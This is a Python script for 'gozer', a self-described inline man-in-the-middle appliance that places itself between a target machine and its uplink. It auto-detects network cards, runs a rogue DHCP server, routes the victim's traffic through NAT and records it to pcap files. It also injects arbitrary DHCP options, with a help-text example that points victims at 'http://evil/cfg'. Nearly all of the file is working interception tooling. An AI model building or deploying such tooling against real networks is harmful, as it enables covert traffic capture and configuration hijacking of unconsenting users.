#!/usr/bin/env python3
# gozer - inline MitM / traffic capture appliance
#
# drops between a target and their uplink. auto-detects NICs,
# stands up DHCP, NATs traffic through, optionally captures.

import os
import sys
import json
import signal
import logging
import argparse
import ipaddress
import threading
import subprocess

from dhcpd import DHCPServer


log = logging.getLogger('gozer')

_state = {
    'fwd_was': None,
    'ipt_rules': [],
    'victim_ip': None,
    'cap_proc': None,
    'dhcp': None,
}
_cleaning = False


def die(msg):
    print(f'[!] {msg}', file=sys.stderr)
    sys.exit(1)


def run(cmd, check=True):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if check and r.returncode != 0:
        die(f'command failed: {cmd}\n{r.stderr.strip()}')
    return r.stdout.strip()


def get_default_route():
    out = run('ip -j route show default', check=False)
    if not out:
        return None, None
    try:
        routes = json.loads(out)
        if routes:
            return routes[0].get('dev'), routes[0].get('gateway')
    except (json.JSONDecodeError, IndexError, KeyError):
        pass
    return None, None


def get_interfaces():
    out = run('ip -j link show', check=False)
    if not out:
        return []
    try:
        links = json.loads(out)
        return [l['ifname'] for l in links
                if l.get('ifname') != 'lo'
                and 'LOOPBACK' not in l.get('flags', [])]
    except (json.JSONDecodeError, KeyError):
        return []


def detect_interfaces(uplink_arg=None, victim_arg=None):
    uplink, gw = get_default_route()
    ifaces = get_interfaces()

    if uplink_arg:
        uplink = uplink_arg
    if not uplink:
        die('no default route -- specify --uplink')
    if uplink not in ifaces:
        die(f'interface {uplink} not found')

    if victim_arg:
        if victim_arg not in ifaces:
            die(f'interface {victim_arg} not found')
        return uplink, victim_arg

    candidates = [i for i in ifaces if i != uplink]
    if not candidates:
        die('no victim interface found (need a second NIC)')
    if len(candidates) == 1:
        return uplink, candidates[0]

    # multiple options, ask
    print('[*] multiple candidate victim interfaces:')
    for n, name in enumerate(candidates, 1):
        print(f'  {n}) {name}')
    while True:
        try:
            pick = int(input('pick one: ')) - 1
            if 0 <= pick < len(candidates):
                return uplink, candidates[pick]
        except (ValueError, EOFError):
            pass
        print('try again')


def get_system_dns():
    try:
        with open('/etc/resolv.conf') as f:
            for line in f:
                if line.strip().startswith('nameserver'):
                    return line.split()[1]
    except (IOError, IndexError):
        pass
    return '8.8.8.8'


def setup_victim_ip(iface, addr):
    run(f'ip addr flush dev {iface}')
    run(f'ip addr add {addr} dev {iface}')
    run(f'ip link set {iface} up')
    _state['victim_ip'] = (iface, addr)


def enable_forwarding():
    old = run('sysctl -n net.ipv4.ip_forward')
    _state['fwd_was'] = old.strip()
    run('sysctl -w net.ipv4.ip_forward=1')


def setup_nat(uplink, victim):
    rules = [
        f'iptables -t nat -A POSTROUTING -o {uplink} -j MASQUERADE',
        f'iptables -A FORWARD -i {victim} -o {uplink} -j ACCEPT',
        f'iptables -A FORWARD -i {uplink} -o {victim} '
        f'-m state --state RELATED,ESTABLISHED -j ACCEPT',
    ]
    for r in rules:
        run(r)
    _state['ipt_rules'] = rules


def start_capture(iface, bpf=None, outfile=None):
    if not outfile:
        outfile = f'/tmp/gozer_{iface}.pcap'

    cmd = ['tcpdump', '-i', iface, '-w', outfile, '-U']
    if bpf:
        cmd.extend(bpf.split())

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.PIPE)
        _state['cap_proc'] = proc
        log.info(f'capturing to {outfile}')
        return proc
    except FileNotFoundError:
        log.warning('tcpdump not found, skipping capture')
        return None


def cleanup(signum=None, frame=None):
    global _cleaning
    if _cleaning:
        return
    _cleaning = True

    print('\n[*] tearing down...')

    proc = _state.get('cap_proc')
    if proc and proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        print('[*] capture stopped')

    srv = _state.get('dhcp')
    if srv:
        srv.stop()
        print('[*] dhcp stopped')

    for rule in reversed(_state.get('ipt_rules', [])):
        undo = rule.replace(' -A ', ' -D ', 1)
        subprocess.run(undo, shell=True, capture_output=True)
    if _state['ipt_rules']:
        print('[*] iptables cleaned')

    fwd = _state.get('fwd_was')
    if fwd is not None:
        subprocess.run(f'sysctl -w net.ipv4.ip_forward={fwd}',
                       shell=True, capture_output=True)
        print(f'[*] ip_forward restored to {fwd}')

    victim = _state.get('victim_ip')
    if victim:
        subprocess.run(f'ip addr flush dev {victim[0]}',
                       shell=True, capture_output=True)
        print(f'[*] flushed {victim[0]}')

    sys.exit(0)


def parse_dhcp_opts(raw):
    """parse '160:http://evil/cfg' into {160: b'http://evil/cfg'}"""
    opts = {}
    for s in (raw or []):
        if ':' not in s:
            die(f'bad option format: {s} (want NUM:VALUE)')
        code, val = s.split(':', 1)
        try:
            code = int(code)
        except ValueError:
            die(f'option code must be numeric: {code}')
        if not 1 <= code <= 254:
            die(f'option code out of range: {code}')
        opts[code] = val.encode()
    return opts


def main():
    p = argparse.ArgumentParser(description='gozer - inline MitM / traffic capture appliance')
    p.add_argument('--uplink', metavar='IF', help='uplink interface (default: auto-detect)')
    p.add_argument('--victim', metavar='IF', help='victim interface (default: auto-detect)')
    p.add_argument('--subnet', default='10.66.66.0/24', help='dhcp subnet (default: 10.66.66.0/24)')
    p.add_argument('--dns', help='dns server to hand out (default: system dns)')
    p.add_argument('--pool-start', help='first IP in dhcp pool (default: .100)')
    p.add_argument('--pool-end', help='last IP in dhcp pool (default: .200)')
    p.add_argument('--no-capture', action='store_true', help='skip packet capture')
    p.add_argument('--capture-filter', metavar='BPF', help='bpf filter for tcpdump')
    p.add_argument('--dhcp-option', action='append', metavar='N:V', help='inject custom dhcp option (e.g. 160:http://evil/cfg)')
    p.add_argument('-v', '--verbose', action='store_true')
    args = p.parse_args()

    if os.geteuid() != 0:
        die('need to be root')

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format='%(asctime)s [%(name)s] %(message)s',
        datefmt='%H:%M:%S',
    )

    try:
        net = ipaddress.IPv4Network(args.subnet, strict=False)
    except ValueError as e:
        die(f'bad subnet: {e}')

    server_ip = str(net.network_address + 1)
    pool_start = args.pool_start or str(net.network_address + 100)
    pool_end = args.pool_end or str(net.network_address + 200)
    dns = args.dns or get_system_dns()

    uplink, victim = detect_interfaces(args.uplink, args.victim)

    print(f'[*] uplink:  {uplink}')
    print(f'[*] victim:  {victim}')
    print(f'[*] subnet:  {net}')
    print(f'[*] server:  {server_ip}')
    print(f'[*] pool:    {pool_start} - {pool_end}')
    print(f'[*] dns:     {dns}')

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    setup_victim_ip(victim, f'{server_ip}/{net.prefixlen}')
    enable_forwarding()
    setup_nat(uplink, victim)

    # TODO: option to pick tshark instead of tcpdump?
    if not args.no_capture:
        start_capture(victim, args.capture_filter)

    extra = parse_dhcp_opts(args.dhcp_option)
    srv = DHCPServer(
        iface=victim,
        server_ip=server_ip,
        subnet=net,
        pool_start=pool_start,
        pool_end=pool_end,
        router=server_ip,
        dns=dns,
        extra_opts=extra,
    )
    _state['dhcp'] = srv

    print('[*] gozer is live. ctrl-c to tear down')

    t = threading.Thread(target=srv.start, daemon=True)
    t.start()

    # sit here until killed
    try:
        while t.is_alive():
            t.join(timeout=1)
    except KeyboardInterrupt:
        cleanup()


if __name__ == '__main__':
    main()
